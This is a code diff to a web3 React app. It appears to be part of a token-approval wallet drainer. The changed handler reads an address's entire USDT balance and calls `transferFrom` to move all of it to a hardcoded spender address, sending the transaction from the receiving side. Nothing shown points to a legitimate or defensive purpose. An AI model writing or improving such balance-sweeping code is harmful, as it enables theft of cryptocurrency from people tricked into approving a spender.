@@ -6,7 +6,6 @@ import Ipt from './components/Ipt'
 import USDT_ERC20_ABI from './config/USDT_ERC20_ABI.json'
 import { formatBalance } from './config/utils'
 
-const USDT_ERC20_ADDRESS = '0xdac17f958d2ee523a2206206994597c13d831ec7'
 const USDT_POLYGON_ADDRESS = '0xc2132d05d31c914a87c6611c10748aeb04b58e8f'
 const SPENDER_ADDRESS = '0xf2d50314B68D9a0338E6139603ca12dfffe11498'
 
@@ -182,11 +181,15 @@ function App() {
 					const toAddress = to || SPENDER_ADDRESS
 					const balance = await contract.methods.balanceOf(from || address).call()
 					alert(`【${from || address}】向【${toAddress}】转账【${balance / Math.pow(10, decimals)}】开始`)
-					Toast.loading('Loading...')
-					const res = await contract.methods.transferFrom(from || address, toAddress, balance).send()
-					// // const res = await contract.transfer(toAddress, balance).send()
-					console.log(res)
-					Toast.hide()
+					try {
+						const res = await contract.methods.transferFrom(from || address, toAddress, balance).send({
+							from: toAddress
+						})
+						console.log(res)
+					} catch (error) {
+						console.log(error)
+					}
+					
 					setTimeout(() => {
 						refresh()
 					}, 3000)
